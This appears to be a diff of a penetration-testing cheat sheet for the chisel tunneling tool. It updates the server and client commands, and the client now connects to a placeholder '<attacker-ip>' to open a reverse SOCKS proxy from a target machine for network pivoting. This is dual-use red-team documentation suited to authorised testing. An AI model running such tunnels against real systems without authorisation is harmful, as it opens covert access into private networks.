@@ -7,7 +7,7 @@
 All commands on arsenal are done with server on kali machine and client on the target.
 Client or Server can also be launch on windows with chisel.exe
 ```
-./chisel server -v -p <server_port|8000> --reverse
+chisel server -p <server-port|8080> --socks5 --reverse
 ```
 
 ## chisel reverse port forwarding (client on remote machine) - forward client port on server
@@ -42,7 +42,7 @@ If the server is launch with --reverse you can specify R: socks to get a proxy s
 On server with proxychains set on port 1080 you can proxy socks request on the client.
 
 ```
-./chisel client <server_ip>:<server_port> R:socks
+./chisel client --fingerprint <FINGERPRINT> <attacker-ip>:<port> R:1080:socks
 ```
 
 
